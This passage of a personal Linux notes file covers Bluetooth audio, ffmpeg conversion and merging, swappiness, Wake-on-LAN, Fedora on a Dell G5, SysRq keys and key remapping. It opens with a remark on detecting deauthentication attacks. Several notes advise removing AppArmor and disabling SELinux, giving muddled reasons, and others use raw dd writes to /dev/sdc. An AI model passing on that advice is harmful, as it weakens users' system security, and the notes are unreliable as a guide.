Until then, you can use devices which support protected management frames,
or if you suspect that you're being targeted with an attack like this, you can detect it using
an intrusion detection system (IDS). Kismet can be used as an IDS to detect this sort of attack,
as it will give you a warning on detecting dissasociation or deauthentication frames being sprayed
across a network.

echo "sleep 1 minutes..." ;
sleep 60 ;
done
}

;;;; how to run bluetooth speaker from linux ;;;;
1- lxpanelctl restart   # to restart lxde
2- apt-get install pulseaudio-module-bluetooth
3- killall pulseaudio
4- systemctl restart bluetooth.service
5- bluetoothctl
             power on
             agent on
             default-agent
             scan on
             pair     30:21:91:2D:C5:58
             connect  30:21:91:2D:C5:58

    note:-  if not connected then
            pulseaudio -k
              then
             connect  30:21:91:2D:C5:58
	     restart vlc

 scan off
 then open pulseaudio   from speaker icon in system tray  launch mixer
 restart vlc

 disconnect 30:21:91:2D:C5:58
 exit

convert mp4 to mp3 witho the smallest size.
-vn  disable video
-ar  audio rate
-ac  channels
-b:a audio bitrate

ffmpeg  -i   /media/D/film/me/scjp_video/ch1.mp4  -vn -ar 8000  -ac 2 -b:a 64k   /media/D/film/me/scjp_video/ch1.mp3

# select displays, laptop or tv
# in .bashrc , just type mydis to toggle displays
 mydis(){
     xfce4-display-settings -m
 }
# command      xfce4-display-settings
# setting config
# tv     only 1280 x 720  ==> tv profile
# laptop only 1366 x 768  ==> laptop profile
# both        1280 X 720  ==> both profile
#
# contrast 36, brightness 16, color 50, sharpen 50, color temp cool

keyboard speed 600 25 

the solution is ahmad_config.sh
;; put r rate 400 25 instead of 240 14
#  r => repeat delay (600ms default), rate => repeat rate (25 default)
#  xkbset -bell  r rate 240 14           -mousekeys -mousekeysaccel -accessx    sticky  -twokey -latchlock  -slowkeys -bouncekeys -feedback -dumbbell -led -feature -slowwarn -slowpress -slowaccept -slowreject  -slowrelease -bouncereject -stickybeep  -overlay1 -overlay2 -ignoregrouplock
   xkbset -bell  r rate   400 25           -mousekeys -mousekeysaccel -accessx    sticky  -twokey -latchlock  -slowkeys -bouncekeys -feedback -dumbbell -led -feature -slowwarn -slowpress -slowaccept -slowreject  -slowrelease -bouncereject -stickybeep  -overlay1 -overlay2 -ignoregrouplock

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
kern.log file message means
Oct  6 10:13:09 zinko kernel: [ 3993.096155] perf: interrupt took too long (3139 > 3133), lowering kernel.perf_event_max_sample_rate to 63500
means ===>
    Perf is a Linux Kernel performance monitor.
    Perf uses Non-Maskable Interrupts. This basically means Perf can tell the cpu “Pauze whatever you’re doing now and let me do something”. This allows perf to have a “watchdog” functionality where it can monitor even the most critical processes and interrupts.
With great power comes great responsibility. Perf can hang your computer by constantly pauzing
everything. To make sure this won’t happen, the kernel itself monitors perf.
When it decides perf is pauzing too long, it tells perf to do a little bit less.
That’s basically what that dmesg line means. The kernel told perf to do a little bit less.
Does it have anything to do with the Wifi problem? Probably not… But at least I learned something:
The kernel watches the watchmen…

 mypackagesRemover(){
     sudo aptitude  remove   apparmor   clipit   cron   anacron   accountsservice   avahi-daemon   brltty   modemmanager  fwupd  postfix    thermald  hddtemp  timeshift  wondershaper   clipit  geoclue-2.0  xfconf
     echo "sudo systemctl list-units --type=service     for  list all services"
     echo "sudo fstrim -av   to clean ssd drive"
 }

# note :- fsprotect using the swap, so decrese the swappiness from 60 to 20 ==>(60 means that start using swap when the ram fulled by 40%)
  show the swappiness value by command
  cat /proc/sys/vm/swappiness  ==> must be 20 not 60
  
  to modify  swappiness from 60 to 20 (60 means that start using swap when the ram fulled by 40%)
  1- emacs /etc/sysctl.d/99-sysctl.conf
  2- add this value
     vm.swappiness=20
  3- reboot

  3- reboot

# merge sound files,  takes long time

ffmpeg -i ch23.3gpp     ch23.mp3
ffmpeg -i ch4.3gpp      ch4.mp3
ffmpeg -i "concat:ch1.mp3|ch23.mp3" -acodec copy ch123.mp3

# merge video and audio
ffmpeg  -i ch666.mp3  -i ch666.mp4 -acodec copy -vcodec copy ch6final.mp4

# merge mp3 and mp4
ffmpeg -i ch123.mp3 -i ch123video.mp4    ch123ALL.mp4
ffmpeg -i ch4.mp3 -i ch4video.mp4    ch4ALL.mp4

# extract audio
ffmpeg -i ch6.mp4      ch6.mp3

# extract video
ffmpeg  -i ch6.mp4  -an -vcodec copy ch666.mp4

# increase the sound volume
ffmpeg -i ch666.mp3 -filter:a "volume=4.0" ch6661.mp3;
ffmpeg -i input.mkv -filter:a "volume=4.0" output.mkv;


------------------- merge mp4 files by 4 ways -------------------------
------------------- merge mp4 files by 4 ways -------------------------

###  4 ways to merge mp4 files ####
 first way to merge mp4:- the fastest one
 first way to merge mp4:- 
 first way to merge mp4:- 
    MP4Box  -force-cat -add ch123.mp4 -cat ch4.mp4  -cat ch5.mp4   -new ch12345.mp4


 second way to merge mp4:- very slow
 second way to merge mp4:- 
 second way to merge mp4:- 
   # (the best, slolwer) or or by using and encode files
   #  Concatenate mp4 Files of Different Codecs, Resolutions
      https://ottverse.com/3-easy-ways-to-concatenate-mp4-files-using-ffmpeg/
   ffmpeg -i file1.mp4 -i file2.mp4 -i file3.mp4 -filter_complex "[0:v] [0:a] [1:v] [1:a] [2:v] [2:a] concat=n=3:v=1:a=1 [vv] [aa]"  -map "[vv]" -map "[aa]" mergedVideo.mp4
   ffmpeg -i ch123.mp4 -i ch4.mp4 -i ch5.mp4 -i ch6.mp4 -i ch7.mp4 -i ch8.mp4    -filter_complex "[0:v] [0:a] [1:v] [1:a] [2:v] [2:a] [3:v] [3:a]   [4:v] [4:a]  [5:v] [5:a]    concat=n=6:v=1:a=1  [vv] [aa]"   -map "[vv]" -map "[aa]"  mergedVideo12345678.mp4
      https://ottverse.com/3-easy-ways-to-concatenate-mp4-files-using-ffmpeg/


 third way to merge mp4 :- very slow
 third way to merge mp4 :-
 third way to merge mp4 :-
    first applay this command  command for  all mp4 file
      ffmpeg -i ch1.mp4 -c copy -bsf:v h264_mp4toannexb -f mpegts ch1.ts
      ffmpeg -i ch2.mp4 -c copy -bsf:v h264_mp4toannexb -f mpegts ch2.ts
   then 
   input.txt
           file 'ch1.ts'
           file 'ch4.ts'
           file 'ch5.ts'
           file 'ch6.ts'
   then
   # notes :-     that using     -c copy will not encode the files
   ffmpeg -f  concat -i input.txt   -c copy -bsf:a aac_adtstoasc mergedVideo.mp4


 fourth way to merge mp4:- fast 
 fourth way to merge mp4:- 
 fourth way to merge mp4:- 
    
    input.txt
            file 'ch1.mp4'
            file 'ch4.mp4'
            file 'ch5.mp4'
            file 'ch6.mp4'
    then
           # notes :-     that using     -c copy will not encode the files
           ffmpeg -f concat -i input.txt -c copy ch123456.mp4

problem wol (wake on lan ):-  drains battery problem after shutdown

(solution 1) press and hold shutdown button for 15 second

---------------------------------------
(solution 2) sudo  systemctl poweroff (work)
             sudo shutdown -H -P +0
---------------------------------------

(solution 3)
;; check wol  by  ethtool
sudo ifconfig 
sudo dnf install ethtool
sudo ethtool eth0 | grep Wake
       wake-on: g (work)
       wake-on: d (not work)

sudo ethtool -s eth0 wol d
---------------------------------------

or 
(not good) install tlp 
sudo dnf install tlp tlp-rdw
sudo tlp-stat     ;; status
sudo tlp-stat -s  ;; short status
sudo tlp start    ;; first time then it will be service  systemctl status tlp.service

edit file  /etc/tlp.conf

USB_AUTOSUSPEND_DISABLE_ON_SHUTDOWN=1
WOL_DISABLE=Y
DEVICES_TO_DISABLE_ON_SHUTDOWN="bluetooth wifi wwan"

https://askubuntu.com/questions/974573/battery-drains-down-even-after-shut-down
https://linrunner.de/tlp/




========================== fedora 34 =======================================-
BIOS for dell G5 se :-
usb wakeup ==> enabled
charging mode ===> primary AC (not adptive)
keyboard limmlight ==> dim
light keyboard on ac ==> disabled
light keyboard on battery ==> disabled
boot ===> throut(defalut)
secure boot ==> disabled

su -c 'dd if=~/Downloads/Fedora-Live-Desktop-x86_64-20-1.iso of=/dev/sdc bs=512k'
su -c 'dd if=Fedora-Workstation-Live-x86_64-34-1.2.iso     of=/dev/sdc  bs=512k'


Note:- dell G5 se 5505 fedora Arch
https://wiki.archlinux.org/title/Dell_G5_SE_5505
hibernate not work
suspend   not work
to power off ==> restart then when ask for password press ESC.
secure-boot ==> must be disabled in bios
keyboard-light ==> work with gnome KDE only

problem :-  logout automactically and eat Ram and swap in fedora 34
solution :-
           sudo dnf clean all
           sudo dnf check-update
           sudo dnf update

---------
problem :- when  hang how can i  shutdown gracefully (without lose data or ssd ) in fedora 34 
solution :- press Alt+ key Sysrq(prntScr) + command list in  https://fedoraproject.org/wiki/QA/Sysrq
press Alt+printScr(F13) + command key
https://www.reddit.com/r/Fedora/comments/nlg4kc/do_gracefully_shutdown_command_works_in_fedora/
https://fedoraproject.org/wiki/QA/Sysrq

ALT+ printScr + h ==> help
ALT+ printScr + c - Will perform a kexec reboot in order to take a crashdump.
ALT+ printScr + u ==> Will attempt to remount all mounted filesystems read-only.
ALT+ printScr + s - Will attempt to sync all mounted filesystems.
                b - Will immediately reboot the system without syncing or unmounting your disks.
                c - Will perform a kexec reboot in order to take a crashdump.
                d - Shows all locks that are held.
                e - Send a SIGTERM to all processes, except for init.
                f - Will call oom_kill to kill a memory hog process.
                g - Used by kgdb on ppc and sh platforms.
                h - Will display help (any key that is not listed here will bring forth help )
                i - Send a SIGKILL to all processes, except for init.
                k - Secure Access Key (SAK) Kills all programs on the current virtual terminal.
See important comments below in SAK section.
    l - Shows a stack backtrace for all active CPUs.
    m - Will dump current memory info to your console.
    n - Used to make RT tasks nice-able
    o - Will shut your system off (if configured and supported).
    p - Will dump the current registers and flags to your console.
    q - Will dump a list of all running timers.
    r - Turns off keyboard raw mode and sets it to XLATE.
    s - Will attempt to sync all mounted filesystems.
    t - Will dump a list of current tasks and their information to your console.
    u - Will attempt to remount all mounted filesystems read-only.
    v - Dumps Voyager SMP processor info to your console.
    w - Dumps tasks that are in uninterruptable (blocked) state.
    x - Used by xmon interface on ppc/powerpc platforms.
    0-9 - Sets the console log level, controlling which kernel messages will be printed to your console.




1- create new file named  /etc/sysctl.d/ahmad_sysrq.conf
# edit file with this line only 
  kernel.sysrq = 1


2- then restart 
# to check it by
cat /proc/sys/kernel/sysrq
must be 1 not any other number

3- sudo   ln -s  /home/ahmad/.emacs.d/jadx-1.1.0/bin/jadx-gui  /usr/bin/jadx-gui



in fedora
  cat /proc/sys/vm/swappiness

   vm.swappiness=5
   reboot

[remove it in debian]  apparmor, apt-get remove apparmor,
                      it is like Selinux in fedora, for divide memory and process,
		      security issues, so stop and remove this service
                        sudo update-rc.d -f apparmor remove, then apt-get remove apparmor
in fedora 
Edit the /etc/selinux/config file and set the SELINUX to disabled like this 
   SELINUX=disabled

Check the current SELinux status, run: sestatus.
SELinux status:                 disabled



       
SELinux (fedora) == apparmor (debian)
note:- 
Check the current SELinux status, run: sestatus.

# fedora dell G5 se remap keyboards
      sudo  setkeycodes e01d 100  ### ( Rctrl -> Ralt )
      sudo  setkeycodes e038 97   ### ( Ralt -> Rctrl)
      sudo  setkeycodes 38   29   ### ( Lalt -> Lctrl)
      sudo  setkeycodes e05b 56   ### ( Lwin -> Lalt )
      sudo  setkeycodes 3a 56     ### ( caps  -> Lalt )
      sudo  setkeycodes 1d  58    ### ( lCtrl -> caps )
